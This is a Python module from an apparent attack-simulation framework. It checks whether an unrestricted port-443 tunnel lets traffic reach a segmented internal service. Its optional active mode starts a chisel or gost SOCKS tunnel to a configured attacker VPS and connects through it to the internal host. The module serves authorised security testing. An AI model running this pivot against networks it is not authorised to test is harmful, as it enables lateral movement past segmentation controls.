"""Family D — 443 SOCKS pivot to a segmented service (impact proof).

Demonstrates that an unrestricted 443 tunnel collapses segmentation: stand up a
SOCKS proxy over a 443 tunnel to your VPS, then reach an internal service
(RDP/SMB/DB) that blocks *direct* access. If the segmented host is reachable THROUGH
the pivot but not directly, App-ID-on-443 + micro-segmentation are both missing.

  * INDICATOR (default): compare direct reachability of internal_pivot_target with
    the availability of a 443 tunnel egress to attacker_vps. Not-directly-reachable
    + tunnel-egress-available = the pivot would work (finding-precondition).
  * ACTIVE (--active): bring up a real SOCKS tunnel (chisel/gost) to attacker_vps:443,
    then SOCKS5-CONNECT to internal_pivot_target through it, and tear it down.

Config: attacker_vps + internal_pivot_target (host:port). MITRE T1572 / T1021.
"""
import socket
import struct
import time
from modules import _util as U

META = {
    "id": "socks_pivot",
    "name": "443 SOCKS Pivot to Segmented Service",
    "category": "Segmentation",
    "test_type": "attack_sim",
    "family": "D",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "App-ID on 443 (HTTP only) + micro-segmentation independent of egress",
    "fix": "SD-WAN",
    "mitre": ["T1572", "T1021"],
    "tactic": "Lateral Movement",
    "cwe": ["CWE-923"],
    "requires": [],
    "ports": [],
    "success_regex": r"^PIVOT-|^PIVOT-PRECONDITION",
    "blocked_regex": r"pivot blocked",
}

_LOCAL_SOCKS = 11080
_TUNNELS = {
    "chisel": (["chisel", "client", "{vps}:443", "socks"], ["Connected", "tun:"]),
    "gost":   (["gost", f"-L=socks5://:{_LOCAL_SOCKS}", "-F=relay+tls://{vps}:443"],
               ["listening", "forward"]),
}


def _parse_hostport(s):
    if ":" in str(s):
        h, p = str(s).rsplit(":", 1)
        return h, int(p) if p.isdigit() else 0
    return str(s), 0


def _socks5_connect(local_port, dhost, dport, timeout=8):
    """Minimal SOCKS5 CONNECT through 127.0.0.1:local_port. (ok, detail)."""
    try:
        s = socket.create_connection(("127.0.0.1", local_port), timeout=timeout)
    except OSError as e:
        return False, f"local SOCKS not up ({e.__class__.__name__})"
    try:
        s.settimeout(timeout)
        s.sendall(b"\x05\x01\x00")                       # greeting: no-auth
        if s.recv(2) != b"\x05\x00":
            return False, "SOCKS5 handshake failed"
        req = b"\x05\x01\x00\x03" + bytes([len(dhost)]) + dhost.encode() + struct.pack(">H", dport)
        s.sendall(req)
        rep = s.recv(10)
        if len(rep) >= 2 and rep[1] == 0x00:
            return True, "SOCKS5 CONNECT succeeded through the tunnel"
        code = rep[1] if len(rep) >= 2 else -1
        return False, f"SOCKS5 CONNECT refused (rep code {code})"
    except socket.timeout:
        return False, "timed out through SOCKS"
    except Exception as e:
        return False, f"{e.__class__.__name__}: {e}"
    finally:
        s.close()


def run(target, ctx):
    vps = ctx.cfg("attacker_vps")
    piv = ctx.cfg("internal_pivot_target")
    out = ["# 443 SOCKS-pivot test (Family D)"]
    if not vps or not piv:
        out.append(U.skip("attacker_vps and/or internal_pivot_target not configured — "
                          "need both to test the 443 SOCKS pivot."))
        return "\n".join(out)
    dhost, dport = _parse_hostport(piv)

    # ---- indicator: direct reachability vs tunnel-egress availability ----------
    direct = U.tcp_state(dhost, dport, ctx, timeout=5)
    tunnel_ok, tdet = U.tls_reachable(vps, 443, ctx)
    out.append(f"direct {dhost}:{dport} — {direct}")
    out.append(f"tunnel egress to {vps}:443 — {'available' if tunnel_ok else 'blocked'} ({tdet})")
    if direct != "open" and tunnel_ok:
        out.append(f"PIVOT-PRECONDITION — {dhost}:{dport} is NOT directly reachable but a 443 "
                   f"tunnel to {vps} IS available: a SOCKS pivot would bypass the "
                   "segmentation. [FINDING-precondition]")
    elif direct == "open":
        out.append("note: the segmented target is already directly reachable — segmentation "
                   "gap exists without a pivot (see segmentation_sweep).")

    if not ctx.allow_active:
        out.append(U.skip("--active not set — not establishing the live SOCKS pivot."))
        return "\n".join(out)

    # ---- active: real SOCKS over 443, then CONNECT to the segmented target -----
    tool = next((t for t in _TUNNELS if U.have(t)), None)
    if not tool:
        out.append("[ERROR] --active set but no SOCKS tunnel tool found (install chisel or gost)")
        return "\n".join(out)
    argv, keys = _TUNNELS[tool]
    argv = [a.replace("{vps}", vps) for a in argv]
    out.append(f"[ACTIVE] {tool} SOCKS over {vps}:443, then SOCKS5->{dhost}:{dport} …")
    import subprocess
    try:
        p = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        out.append(f"[ERROR] {tool} not found")
        return "\n".join(out)
    try:
        # wait for the local SOCKS port to open (tunnel established)
        up = False
        for _ in range(20):
            if U.tcp_state("127.0.0.1", _LOCAL_SOCKS, None, timeout=1) == "open":
                up = True
                break
            if p.poll() is not None:
                break
            time.sleep(0.5)
        if not up:
            out.append(f"[SKIP] {tool} SOCKS did not come up (check the VPS-side server)")
        else:
            ok, detail = _socks5_connect(_LOCAL_SOCKS, dhost, dport)
            if ok:
                out.append(f"PIVOT-CONFIRMED — reached segmented {dhost}:{dport} THROUGH the "
                           f"443 tunnel ({detail}). Unrestricted 443 collapses segmentation. "
                           "Impact proven (torn down).")
            else:
                out.append(f"pivot blocked — could not reach {dhost}:{dport} via the tunnel "
                           f"({detail})")
    finally:
        try:
            p.terminate()
            try:
                p.wait(timeout=5)
            except Exception:
                p.kill()
        except Exception:
            pass
    return "\n".join(out)
